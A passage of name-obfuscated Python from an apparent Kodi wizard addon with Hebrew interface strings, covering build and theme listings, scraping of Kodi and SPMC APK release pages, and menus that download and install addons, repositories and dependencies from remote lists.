		elif O00O0000O000OO000 >0 :#line:2046
			if OO00O000O00O00O00 >0 :#line:2047
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2048
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
			else :#line:2050
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2051
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2052
	setView ('files','viewType')#line:2053
def viewBuild (OO0000O0O00OOO000 ):#line:2055
	OOOO0O00OO00000OO =wiz .workingURL (SPEEDFILE )#line:2056
	if not OOOO0O00OO00000OO ==True :#line:2057
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2058
		addFile ('%s'%OOOO0O00OO00000OO ,'',themeit =THEME3 )#line:2059
		return #line:2060
	if wiz .checkBuild (OO0000O0O00OOO000 ,'version')==False :#line:2061
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2062
		addFile ('%s was not found in the builds list.'%OO0000O0O00OOO000 ,'',themeit =THEME3 )#line:2063
		return #line:2064
	O0O000OOOOOOO0O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2065
	O0000OOOO00OOO0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0000O0O00OOO000 ).findall (O0O000OOOOOOO0O0O )#line:2066
	for OOOO00O0O0OOOOOO0 ,O0O0O0OOO00O00000 ,O0000OO0000000O00 ,O000OO00OOOOO0OO0 ,O0O0OOOOOO0O000O0 ,OO0O00O0OO0OO0O00 ,OOOO0000O0OOOO0O0 ,O00OOO000OOO00000 ,O0000OO0OO0OOOOO0 ,O000000O0O000O0O0 in O0000OOOO00OOO0O0 :#line:2067
		OO0O00O0OO0OO0O00 =OO0O00O0OO0OO0O00 if wiz .workingURL (OO0O00O0OO0OO0O00 )else ICON #line:2068
		OOOO0000O0OOOO0O0 =OOOO0000O0OOOO0O0 if wiz .workingURL (OOOO0000O0OOOO0O0 )else FANART #line:2069
		OO0OO0O000OO00OOO ='%s (v%s)'%(OO0000O0O00OOO000 ,OOOO00O0O0OOOOOO0 )#line:2070
		if BUILDNAME ==OO0000O0O00OOO000 and OOOO00O0O0OOOOOO0 >BUILDVERSION :#line:2071
			OO0OO0O000OO00OOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0OO0O000OO00OOO ,BUILDVERSION )#line:2072
		OOO0O0OO00OO0O00O =int (float (KODIV ));O0O00O0OOO0O00OO0 =int (float (O000OO00OOOOO0OO0 ))#line:2081
		if not OOO0O0OO00OO0O00O ==O0O00O0OOO0O00OO0 :#line:2082
			if OOO0O0OO00OO0O00O ==16 and O0O00O0OOO0O00OO0 <=15 :O00O0OO0OO000OO00 =False #line:2083
			else :O00O0OO0OO000OO00 =True #line:2084
		else :O00O0OO0OO000OO00 =False #line:2085
		addFile ('התקנה','install',OO0000O0O00OOO000 ,'fresh',description =O000000O0O000O0O0 ,fanart =OOOO0000O0OOOO0O0 ,icon =OO0O00O0OO0OO0O00 ,themeit =THEME1 )#line:2089
		if not O0O0OOOOOO0O000O0 =='http://':#line:2092
			if wiz .workingURL (O0O0OOOOOO0O000O0 )==True :#line:2093
				addFile (wiz .sep ('THEMES'),'',fanart =OOOO0000O0OOOO0O0 ,icon =OO0O00O0OO0OO0O00 ,themeit =THEME3 )#line:2094
				O0O000OOOOOOO0O0O =wiz .openURL (O0O0OOOOOO0O000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2095
				O0000OOOO00OOO0O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O000OOOOOOO0O0O )#line:2096
				for O0OOO0000O00OO0OO ,OOOO00OOO0O0O000O ,OO0O0O00OOO0OO0O0 ,OO0O0OO0OO00O0OOO ,O00000O000O00O0O0 ,O000000O0O000O0O0 in O0000OOOO00OOO0O0 :#line:2097
					if not SHOWADULT =='true'and O00000O000O00O0O0 .lower ()=='yes':continue #line:2098
					OO0O0O00OOO0OO0O0 =OO0O0O00OOO0OO0O0 if OO0O0O00OOO0OO0O0 =='http://'else OO0O00O0OO0OO0O00 #line:2099
					OO0O0OO0OO00O0OOO =OO0O0OO0OO00O0OOO if OO0O0OO0OO00O0OOO =='http://'else OOOO0000O0OOOO0O0 #line:2100
					addFile (O0OOO0000O00OO0OO if not O0OOO0000O00OO0OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0OOO0000O00OO0OO ,'theme',OO0000O0O00OOO000 ,O0OOO0000O00OO0OO ,description =O000000O0O000O0O0 ,fanart =OO0O0OO0OO00O0OOO ,icon =OO0O0O00OOO0OO0O0 ,themeit =THEME3 )#line:2101
	setView ('files','viewType')#line:2102
def viewThirdList (O0000O00O00OOOOO0 ):#line:2104
	O0000O000OOO00000 =eval ('THIRD%sNAME'%O0000O00O00OOOOO0 )#line:2105
	O000OO0O00OO0O00O =eval ('THIRD%sURL'%O0000O00O00OOOOO0 )#line:2106
	O00OO0OOO0OO0OOOO =wiz .workingURL (O000OO0O00OO0O00O )#line:2107
	if not O00OO0OOO0OO0OOOO ==True :#line:2108
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2109
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2110
	else :#line:2111
		OO0OO0O000O00O0O0 ,O0O00OOOOOO0O00OO =wiz .thirdParty (O000OO0O00OO0O00O )#line:2112
		addFile ("[B]%s[/B]"%O0000O000OOO00000 ,'',themeit =THEME3 )#line:2113
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2114
		if OO0OO0O000O00O0O0 :#line:2115
			for O0000O000OOO00000 ,O000O00OO0OO0OOOO ,O000OO0O00OO0O00O ,O0OOO00OOOO000OOO ,OO0OO0O0O00OOO0OO ,O00O00OOOO00O00OO ,O00OOO0O0O00O0O0O ,O0000O000OOO00OOO in O0O00OOOOOO0O00OO :#line:2116
				if not SHOWADULT =='true'and O00OOO0O0O00O0O0O .lower ()=='yes':continue #line:2117
				addFile ("[%s] %s v%s"%(O0OOO00OOOO000OOO ,O0000O000OOO00000 ,O000O00OO0OO0OOOO ),'installthird',O0000O000OOO00000 ,O000OO0O00OO0O00O ,icon =OO0OO0O0O00OOO0OO ,fanart =O00O00OOOO00O00OO ,description =O0000O000OOO00OOO ,themeit =THEME2 )#line:2118
		else :#line:2119
			for O0000O000OOO00000 ,O000OO0O00OO0O00O ,OO0OO0O0O00OOO0OO ,O00O00OOOO00O00OO ,O0000O000OOO00OOO in O0O00OOOOOO0O00OO :#line:2120
				addFile (O0000O000OOO00000 ,'installthird',O0000O000OOO00000 ,O000OO0O00OO0O00O ,icon =OO0OO0O0O00OOO0OO ,fanart =O00O00OOOO00O00OO ,description =O0000O000OOO00OOO ,themeit =THEME2 )#line:2121
def editThirdParty (O00O0O0O00O0O0OO0 ):#line:2123
	O00000OO00O00000O =eval ('THIRD%sNAME'%O00O0O0O00O0O0OO0 )#line:2124
	O00OOOO0OO00O0000 =eval ('THIRD%sURL'%O00O0O0O00O0O0OO0 )#line:2125
	O00OO0O0O00O00OO0 =wiz .getKeyboard (O00000OO00O00000O ,'Enter the Name of the Wizard')#line:2126
	O00OOOO000O00O0O0 =wiz .getKeyboard (O00OOOO0OO00O0000 ,'Enter the URL of the Wizard Text')#line:2127
	wiz .setS ('wizard%sname'%O00O0O0O00O0O0OO0 ,O00OO0O0O00O00OO0 )#line:2129
	wiz .setS ('wizard%surl'%O00O0O0O00O0O0OO0 ,O00OOOO000O00O0O0 )#line:2130
def apkScraper (name =""):#line:2132
	if name =='kodi':#line:2133
		OOOO00O0OO0O0OO00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2134
		OO0000OO000OO0O0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2135
		O00O00000O00O00O0 =wiz .openURL (OOOO00O0OO0O0OO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2136
		O0OOOO000OOO00000 =wiz .openURL (OO0000OO000OO0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2137
		OO0O00OO00O0OOOOO =0 #line:2138
		OOOOO0000O0000O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O00000O00O00O0 )#line:2139
		O0OOO00OO00000O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OOOO000OOO00000 )#line:2140
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2142
		O0000OO0O0O000O00 =False #line:2143
		for OOOOO00O0O00000OO ,name ,O000OOOOOO00O000O ,O0OOO0O00O0OO00O0 in OOOOO0000O0000O00 :#line:2144
			if OOOOO00O0O00000OO in ['../','old/']:continue #line:2145
			if not OOOOO00O0O00000OO .endswith ('.apk'):continue #line:2146
			if not OOOOO00O0O00000OO .find ('_')==-1 and O0000OO0O0O000O00 ==True :continue #line:2147
			try :#line:2148
				OOO00O0OO0OOO00OO =name .split ('-')#line:2149
				if not OOOOO00O0O00000OO .find ('_')==-1 :#line:2150
					O0000OO0O0O000O00 =True #line:2151
					OO000O0OO00O0O0O0 ,OO00OOOO0000OO000 =OOO00O0OO0OOO00OO [2 ].split ('_')#line:2152
				else :#line:2153
					OO000O0OO00O0O0O0 =OOO00O0OO0OOO00OO [2 ]#line:2154
					OO00OOOO0000OO000 =''#line:2155
				OO00OO000OO0OO000 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O0OO0OOO00OO [0 ].title (),OOO00O0OO0OOO00OO [1 ],OO00OOOO0000OO000 .upper (),OO000O0OO00O0O0O0 ,COLOR2 ,O000OOOOOO00O000O .replace (' ',''),COLOR1 ,O0OOO0O00O0OO00O0 )#line:2156
				OO0O00O0O00O0O00O =urljoin (OOOO00O0OO0O0OO00 ,OOOOO00O0O00000OO )#line:2157
				addFile (OO00OO000OO0OO000 ,'apkinstall',"%s v%s%s %s"%(OOO00O0OO0OOO00OO [0 ].title (),OOO00O0OO0OOO00OO [1 ],OO00OOOO0000OO000 .upper (),OO000O0OO00O0O0O0 ),OO0O00O0O00O0O00O )#line:2158
				OO0O00OO00O0OOOOO +=1 #line:2159
			except :#line:2160
				wiz .log ("Error on: %s"%name )#line:2161
		for OOOOO00O0O00000OO ,name ,O000OOOOOO00O000O ,O0OOO0O00O0OO00O0 in O0OOO00OO00000O00 :#line:2163
			if OOOOO00O0O00000OO in ['../','old/']:continue #line:2164
			if not OOOOO00O0O00000OO .endswith ('.apk'):continue #line:2165
			if not OOOOO00O0O00000OO .find ('_')==-1 :continue #line:2166
			try :#line:2167
				OOO00O0OO0OOO00OO =name .split ('-')#line:2168
				OO00OO000OO0OO000 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O0OO0OOO00OO [0 ].title (),OOO00O0OO0OOO00OO [1 ],OOO00O0OO0OOO00OO [2 ],COLOR2 ,O000OOOOOO00O000O .replace (' ',''),COLOR1 ,O0OOO0O00O0OO00O0 )#line:2169
				OO0O00O0O00O0O00O =urljoin (OO0000OO000OO0O0O ,OOOOO00O0O00000OO )#line:2170
				addFile (OO00OO000OO0OO000 ,'apkinstall',"%s v%s %s"%(OOO00O0OO0OOO00OO [0 ].title (),OOO00O0OO0OOO00OO [1 ],OOO00O0OO0OOO00OO [2 ]),OO0O00O0O00O0O00O )#line:2171
				OO0O00OO00O0OOOOO +=1 #line:2172
			except :#line:2173
				wiz .log ("Error on: %s"%name )#line:2174
		if OO0O00OO00O0OOOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2175
	elif name =='spmc':#line:2176
		OO0O0O0O0O000O000 ='https://github.com/koying/SPMC/releases'#line:2177
		O00O00000O00O00O0 =wiz .openURL (OO0O0O0O0O000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2178
		OO0O00OO00O0OOOOO =0 #line:2179
		OOOOO0000O0000O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00O00000O00O00O0 )#line:2180
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2182
		for name ,O0O0OO000OOO0O00O in OOOOO0000O0000O00 :#line:2184
			O00OOOOOOO0O0O0O0 =''#line:2185
			O0OOO00OO00000O00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0O0OO000OOO0O00O )#line:2186
			for O00OO0000O0OOO00O ,OOO0000O0OO00O0OO ,OO0OO0000000O0O00 in O0OOO00OO00000O00 :#line:2187
				if OO0OO0000000O0O00 .find ('armeabi')==-1 :continue #line:2188
				if OO0OO0000000O0O00 .find ('launcher')>-1 :continue #line:2189
				O00OOOOOOO0O0O0O0 =urljoin ('https://github.com',O00OO0000O0OOO00O )#line:2190
				break #line:2191
		if OO0O00OO00O0OOOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2193
def apkMenu (url =None ):#line:2195
	if url ==None :#line:2196
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2199
	if not APKFILE =='http://':#line:2200
		if url ==None :#line:2201
			OOO000O0OO000OO0O =wiz .workingURL (APKFILE )#line:2202
			OO0O0000O000O0OO0 =uservar .APKFILE #line:2203
		else :#line:2204
			OOO000O0OO000OO0O =wiz .workingURL (url )#line:2205
			OO0O0000O000O0OO0 =url #line:2206
		if OOO000O0OO000OO0O ==True :#line:2207
			OO000O0O0OOO0OOOO =wiz .openURL (OO0O0000O000O0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2208
			O000000O0O00OO00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO000O0O0OOO0OOOO )#line:2209
			if len (O000000O0O00OO00O )>0 :#line:2210
				OO0O00O0O0O00OO00 =0 #line:2211
				for OO0000O00OO0OO00O ,O0OO0000O0000OO00 ,url ,OOO00000O0O000OO0 ,O00O0OOOO0O0OOOOO ,OO0O0OO0O0OOO0000 ,OO0OOOOO00O00000O in O000000O0O00OO00O :#line:2212
					if not SHOWADULT =='true'and OO0O0OO0O0OOO0000 .lower ()=='yes':continue #line:2213
					if O0OO0000O0000OO00 .lower ()=='yes':#line:2214
						OO0O00O0O0O00OO00 +=1 #line:2215
						addDir ("[B]%s[/B]"%OO0000O00OO0OO00O ,'apk',url ,description =OO0OOOOO00O00000O ,icon =OOO00000O0O000OO0 ,fanart =O00O0OOOO0O0OOOOO ,themeit =THEME3 )#line:2216
					else :#line:2217
						OO0O00O0O0O00OO00 +=1 #line:2218
						addFile (OO0000O00OO0OO00O ,'apkinstall',OO0000O00OO0OO00O ,url ,description =OO0OOOOO00O00000O ,icon =OOO00000O0O000OO0 ,fanart =O00O0OOOO0O0OOOOO ,themeit =THEME2 )#line:2219
					if OO0O00O0O0O00OO00 <1 :#line:2220
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2221
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2222
		else :#line:2223
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2224
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2225
			addFile ('%s'%OOO000O0OO000OO0O ,'',themeit =THEME3 )#line:2226
		return #line:2227
	else :wiz .log ("[APK Menu] No APK list added.")#line:2228
	setView ('files','viewType')#line:2229
def addonMenu (url =None ):#line:2231
	if not ADDONFILE =='http://':#line:2232
		if url ==None :#line:2233
			O00OOOO0O000O0OO0 =wiz .workingURL (ADDONFILE )#line:2234
			O00O0OOOOO0O0O000 =uservar .ADDONFILE #line:2235
		else :#line:2236
			O00OOOO0O000O0OO0 =wiz .workingURL (url )#line:2237
			O00O0OOOOO0O0O000 =url #line:2238
		if O00OOOO0O000O0OO0 ==True :#line:2239
			OOOO00000000O00O0 =wiz .openURL (O00O0OOOOO0O0O000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2240
			O00O0OOO0O00OO000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO00000000O00O0 )#line:2241
			if len (O00O0OOO0O00OO000 )>0 :#line:2242
				O0OOOOO0OO0OOOOOO =0 #line:2243
				for OO00O0OO000OO0OOO ,O00OO00OOOOOO00OO ,url ,OO0000O00OO0O00OO ,OO0O0OO0OOO0OOO0O ,O0OO00OO000O0OOOO ,O000OOOOOOOO0O000 ,O0OO00000O0OO000O ,OOO0OO0OOOOO0O0O0 ,OO00OOO0OOOOOOO00 in O00O0OOO0O00OO000 :#line:2244
					if O00OO00OOOOOO00OO .lower ()=='section':#line:2245
						O0OOOOO0OO0OOOOOO +=1 #line:2246
						addDir ("[B]%s[/B]"%OO00O0OO000OO0OOO ,'addons',url ,description =OO00OOO0OOOOOOO00 ,icon =O000OOOOOOOO0O000 ,fanart =O0OO00000O0OO000O ,themeit =THEME3 )#line:2247
					else :#line:2248
						if not SHOWADULT =='true'and OOO0OO0OOOOO0O0O0 .lower ()=='yes':continue #line:2249
						try :#line:2250
							OO0OOOOOOOO0O0000 =xbmcaddon .Addon (id =O00OO00OOOOOO00OO ).getAddonInfo ('path')#line:2251
							if os .path .exists (OO0OOOOOOOO0O0000 ):#line:2252
								OO00O0OO000OO0OOO ="[COLOR green][Installed][/COLOR] %s"%OO00O0OO000OO0OOO #line:2253
						except :#line:2254
							pass #line:2255
						O0OOOOO0OO0OOOOOO +=1 #line:2256
						addFile (OO00O0OO000OO0OOO ,'addoninstall',O00OO00OOOOOO00OO ,O00O0OOOOO0O0O000 ,description =OO00OOO0OOOOOOO00 ,icon =O000OOOOOOOO0O000 ,fanart =O0OO00000O0OO000O ,themeit =THEME2 )#line:2257
					if O0OOOOO0OO0OOOOOO <1 :#line:2258
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2259
			else :#line:2260
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2261
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2262
		else :#line:2263
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2264
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2265
			addFile ('%s'%O00OOOO0O000O0OO0 ,'',themeit =THEME3 )#line:2266
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2267
	setView ('files','viewType')#line:2268
def addonInstaller (OO0O0OOOOO00O000O ,O0OOOOO00O000OO0O ):#line:2270
	if not ADDONFILE =='http://':#line:2271
		O00O0000O0OOOO000 =wiz .workingURL (O0OOOOO00O000OO0O )#line:2272
		if O00O0000O0OOOO000 ==True :#line:2273
			OO0O0O00000OO0OOO =wiz .openURL (O0OOOOO00O000OO0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2274
			OO0OO00OO0O000OOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0O0OOOOO00O000O ).findall (OO0O0O00000OO0OOO )#line:2275
			if len (OO0OO00OO0O000OOO )>0 :#line:2276
				for O00OOO000OO00O0O0 ,O0OOOOO00O000OO0O ,OOOO0O0OO00OO0O00 ,O000O0O0OO0O0O000 ,OO00000OOOOOO0OO0 ,OO0O0OO0OOO0O0O0O ,OOOO00OO0O0O0OOO0 ,O000OO0000000O0OO ,O000O00OO0OO0OO00 in OO0OO00OO0O000OOO :#line:2277
					if os .path .exists (os .path .join (ADDONS ,OO0O0OOOOO00O000O )):#line:2278
						O0O00OOOOO0OO000O =['Launch Addon','Remove Addon']#line:2279
						O0OO0O00000000OOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0O00OOOOO0OO000O )#line:2280
						if O0OO0O00000000OOO ==0 :#line:2281
							wiz .ebi ('RunAddon(%s)'%OO0O0OOOOO00O000O )#line:2282
							xbmc .sleep (1000 )#line:2283
							return True #line:2284
						elif O0OO0O00000000OOO ==1 :#line:2285
							wiz .cleanHouse (os .path .join (ADDONS ,OO0O0OOOOO00O000O ))#line:2286
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0O0OOOOO00O000O ))#line:2287
							except :pass #line:2288
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0O0OOOOO00O000O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2289
								removeAddonData (OO0O0OOOOO00O000O )#line:2290
							wiz .refresh ()#line:2291
							return True #line:2292
						else :#line:2293
							return False #line:2294
					O0O0O0000O00OOOO0 =os .path .join (ADDONS ,OOOO0O0OO00OO0O00 )#line:2295
					if not OOOO0O0OO00OO0O00 .lower ()=='none'and not os .path .exists (O0O0O0000O00OOOO0 ):#line:2296
						wiz .log ("Repository not installed, installing it")#line:2297
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0O0OOOOO00O000O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO0O0OO00OO0O00 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2298
							OO0O0O0O0OOOOOOOO =wiz .parseDOM (wiz .openURL (O000O0O0OO0O0O000 ),'addon',ret ='version',attrs ={'id':OOOO0O0OO00OO0O00 })#line:2299
							if len (OO0O0O0O0OOOOOOOO )>0 :#line:2300
								OOO00O0O0O0O0O0O0 ='%s%s-%s.zip'%(OO00000OOOOOO0OO0 ,OOOO0O0OO00OO0O00 ,OO0O0O0O0OOOOOOOO [0 ])#line:2301
								wiz .log (OOO00O0O0O0O0O0O0 )#line:2302
								if KODIV >=17 :wiz .addonDatabase (OOOO0O0OO00OO0O00 ,1 )#line:2303
								installAddon (OOOO0O0OO00OO0O00 ,OOO00O0O0O0O0O0O0 )#line:2304
								wiz .ebi ('UpdateAddonRepos()')#line:2305
								wiz .log ("Installing Addon from Kodi")#line:2307
								OO0000O0000OOOO00 =installFromKodi (OO0O0OOOOO00O000O )#line:2308
								wiz .log ("Install from Kodi: %s"%OO0000O0000OOOO00 )#line:2309
								if OO0000O0000OOOO00 :#line:2310
									wiz .refresh ()#line:2311
									return True #line:2312
							else :#line:2313
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOO0O0OO00OO0O00 )#line:2314
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0O0OOOOO00O000O ,OOOO0O0OO00OO0O00 ))#line:2315
					elif OOOO0O0OO00OO0O00 .lower ()=='none':#line:2316
						wiz .log ("No repository, installing addon")#line:2317
						OOO0OOOO000O000OO =OO0O0OOOOO00O000O #line:2318
						OOOOO0OOOOO00OOO0 =O0OOOOO00O000OO0O #line:2319
						installAddon (OO0O0OOOOO00O000O ,O0OOOOO00O000OO0O )#line:2320
						wiz .refresh ()#line:2321
						return True #line:2322
					else :#line:2323
						wiz .log ("Repository installed, installing addon")#line:2324
						OO0000O0000OOOO00 =installFromKodi (OO0O0OOOOO00O000O ,False )#line:2325
						if OO0000O0000OOOO00 :#line:2326
							wiz .refresh ()#line:2327
							return True #line:2328
					if os .path .exists (os .path .join (ADDONS ,OO0O0OOOOO00O000O )):return True #line:2329
					OOOO00O0OOO0OOO0O =wiz .parseDOM (wiz .openURL (O000O0O0OO0O0O000 ),'addon',ret ='version',attrs ={'id':OO0O0OOOOO00O000O })#line:2330
					if len (OOOO00O0OOO0OOO0O )>0 :#line:2331
						O0OOOOO00O000OO0O ="%s%s-%s.zip"%(O0OOOOO00O000OO0O ,OO0O0OOOOO00O000O ,OOOO00O0OOO0OOO0O [0 ])#line:2332
						wiz .log (str (O0OOOOO00O000OO0O ))#line:2333
						if KODIV >=17 :wiz .addonDatabase (OO0O0OOOOO00O000O ,1 )#line:2334
						installAddon (OO0O0OOOOO00O000O ,O0OOOOO00O000OO0O )#line:2335
						wiz .refresh ()#line:2336
					else :#line:2337
						wiz .log ("no match");return False #line:2338
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2339
		else :wiz .log ("[Addon Installer] Text File: %s"%O00O0000O0OOOO000 )#line:2340
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2341
def installFromKodi (O0000O0OO00OO0O0O ,over =True ):#line:2343
	if over ==True :#line:2344
		xbmc .sleep (2000 )#line:2345
	wiz .ebi ('RunPlugin(plugin://%s)'%O0000O0OO00OO0O0O )#line:2347
	if not wiz .whileWindow ('yesnodialog'):#line:2348
		return False #line:2349
	xbmc .sleep (1000 )#line:2350
	if wiz .whileWindow ('okdialog'):#line:2351
		return False #line:2352
	wiz .whileWindow ('progressdialog')#line:2353
	if os .path .exists (os .path .join (ADDONS ,O0000O0OO00OO0O0O )):return True #line:2354
	else :return False #line:2355
def installAddon (O0000O0OO0OO0000O ,OOO0O00O0O0OOO000 ):#line:2357
	if not wiz .workingURL (OOO0O00O0O0OOO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0000O0OO0OO0000O ,COLOR2 ));return #line:2358
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2359
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0OO0OO0000O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2360
	O00OOO0O0OOOOOO0O =OOO0O00O0O0OOO000 .split ('/')#line:2361
	OOOOOO0OOO00OOO00 =os .path .join (PACKAGES ,O00OOO0O0OOOOOO0O [-1 ])#line:2362
	try :os .remove (OOOOOO0OOO00OOO00 )#line:2363
	except :pass #line:2364
	downloader .download (OOO0O00O0O0OOO000 ,OOOOOO0OOO00OOO00 ,DP )#line:2365
	O0O000000OO0000OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0OO0OO0000O )#line:2366
	DP .update (0 ,O0O000000OO0000OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2367
	OOOOOO00000OOOOOO ,OOO00O0OOOOO00OOO ,OOOO0OOOOOO0OOOO0 =extract .all (OOOOOO0OOO00OOO00 ,ADDONS ,DP ,title =O0O000000OO0000OO )#line:2368
	DP .update (0 ,O0O000000OO0000OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2369
	installed (O0000O0OO0OO0000O )#line:2370
	installDep (O0000O0OO0OO0000O ,DP )#line:2371
	DP .close ()#line:2372
	wiz .ebi ('UpdateAddonRepos()')#line:2373
	wiz .ebi ('UpdateLocalAddons()')#line:2374
	wiz .refresh ()#line:2375
def installDep (O0000OO000O00O000 ,DP =None ):#line:2377
	OO0OO0O0OOO0OO0OO =os .path .join (ADDONS ,O0000OO000O00O000 ,'addon.xml')#line:2378
	if os .path .exists (OO0OO0O0OOO0OO0OO ):#line:2379
		O0OOO000000000OO0 =open (OO0OO0O0OOO0OO0OO ,mode ='r');OO0O000OO0OO0OO00 =O0OOO000000000OO0 .read ();O0OOO000000000OO0 .close ();#line:2380
		OOO00O0O0O0OOO0OO =wiz .parseDOM (OO0O000OO0OO0OO00 ,'import',ret ='addon')#line:2381
		for O0O00000O0O0OO0O0 in OOO00O0O0O0OOO0OO :#line:2382
			if not 'xbmc.python'in O0O00000O0O0OO0O0 :#line:2383
				if not DP ==None :#line:2384
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00000O0O0OO0O0 ))#line:2385
				wiz .createTemp (O0O00000O0O0OO0O0 )#line:2386
def installed (O0O00O00OOOO00OO0 ):#line:2413
	O000OO000OO00OOO0 =os .path .join (ADDONS ,O0O00O00OOOO00OO0 ,'addon.xml')#line:2414
	if os .path .exists (O000OO000OO00OOO0 ):#line:2415
		try :#line:2416
